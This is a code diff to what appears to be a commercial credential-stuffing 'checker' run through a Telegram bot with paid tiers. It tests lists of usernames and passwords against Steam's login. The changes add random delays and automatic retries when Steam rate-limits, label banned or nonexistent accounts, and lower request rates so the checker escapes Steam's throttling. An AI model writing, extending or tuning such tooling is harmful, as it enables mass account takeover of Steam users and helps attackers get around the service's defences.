@@ -1388,7 +1388,7 @@ def steam_rsa_encrypt(password: str, modulus_hex: str, exponent_hex: str) -> str
     hex_bytes = bytes.fromhex(hex_str)
     return base64.b64encode(hex_bytes).decode('ascii')
 
-def check_steam(username: str, password: str, proxy=None) -> dict:
+def check_steam(username: str, password: str, proxy=None, _retry=0) -> dict:
     """Steam Checker - Fixed 2FA detection (stricter, no more false positives)"""
     result = {
         'email': username,
@@ -1410,6 +1410,7 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
 
     try:
         session = requests.Session()
+        time.sleep(random.uniform(0.5, 1.5)) 
         if proxy:
             session.proxies = {'http': proxy, 'https': proxy}
 
@@ -1515,6 +1516,19 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
             result['message'] = "Invalid username or password"
         elif x_eresult == '6':
             result['message'] = "Account not found"
+        elif x_eresult == '84':
+            if _retry < 2:  # max 2 retries
+                wait = (8 + _retry * 5) + random.uniform(2, 4)
+                print(f"[Steam] Rate limited, retry {_retry+1}/2 in {wait:.1f}s...")
+                time.sleep(wait)
+                return check_steam(username, password, proxy, _retry=_retry+1)
+            else:
+                result['message'] = "Rate limited by Steam, try again later"
+                return result
+        elif x_eresult == '2':
+            result['message'] = "Account disabled / banned"
+        elif x_eresult == '15':
+            result['message'] = "Account does not exist"
         else:
             result['message'] = f"Unknown error (eresult: {x_eresult})"
             return result
@@ -2112,7 +2126,7 @@ async def handle_message(update: Update, context: CallbackContext):
             # Same logic as bulk files
             mode_name = stats.get("api_mode", "Crunchyroll")
             if mode_name == "Steam":
-                max_rps = 8 if limits["display_name"] == "FREE" else 12 if "BASIC" in limits["display_name"] else 18
+                max_rps = 3 if limits["display_name"] == "FREE" else 5 if "BASIC" in limits["display_name"] else 8
             elif limits["display_name"] == "FREE":
                 max_rps = 12
             elif "BASIC" in limits["display_name"]:
